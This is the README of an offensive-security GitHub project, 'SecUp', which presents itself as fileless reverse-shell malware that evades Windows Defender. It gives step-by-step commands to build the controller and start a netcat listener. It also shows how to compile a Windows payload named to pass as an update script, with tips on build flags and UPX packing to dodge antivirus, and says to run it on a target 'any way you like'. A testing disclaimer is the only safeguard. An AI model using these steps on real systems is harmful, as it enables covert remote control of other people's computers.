# SecUp "Malware for Learning"

!!! FOR SECURITY TESTING PURPOSES ONLY !!! <br>
\******************************************************<br>
DO NOT USE THIS ON SYSTEMS THAT YOU DO NOT <br>
OWN UNLESS YOU HAVE EXPRESS PERMISSION !!!

Fileless malware that bypasses Windows Defender using PowerShell and obfuscation. <br>
Just a simple Reverse Shell using a batch script to kick things off, after which everything is fileless.

YouTube video demonstration and explanation >>> https://youtu.be/BFVzmZXIbQk

Setup and Execution<br>
1. Clone this repo<br>
`git clone https://github.com/daniellowrie/update_script`
2. Build **SecUp.go**<br>
`go build SecUp.go`
3. Run **SecUp <LHOST>**<br>
`./SecUp 192.168.1.200`
4. Open another terminal, and start a Listener on port 443 (sudo if not root)<br>
`sudo nc -vnlp 443`
5. Open another terminal, and compile EXE<br>
`GOOS=windows go build update_script.go`
  - A word about comipiling for Windows...
    + I've experienced Golang binaries getting flagged as malware, even "Hello, World!"
      - I've read that removing `-ldflags` and `-trimpath` may help and that the standard build is best for AV evasion
      - I've also read that packing can trip AV detection as well and again the standard build is best for AV evasion
        + BUT if you'd like to make the binary smaller...
          - `GOOS=windows go build -ldflags "-s -w" -trimpath update_script.go`<br>
          - `upx -9 update_script.exe`  
7. Back at the SecUp terminal<br>
`Press ENTER to continue...`
8. Upload and execute `update_script.exe` to target any way you like<br>
9. Shellz! :)
<P></P>
<P></P>
Going to work on building a better mousetrap as this was just a PoC at making something 'malicious' that could bypass Defender.
<P></P>






https://github.com/daniellowrie/update_script/assets/19762230/a83d13e4-108f-4406-b307-bf18704d4278


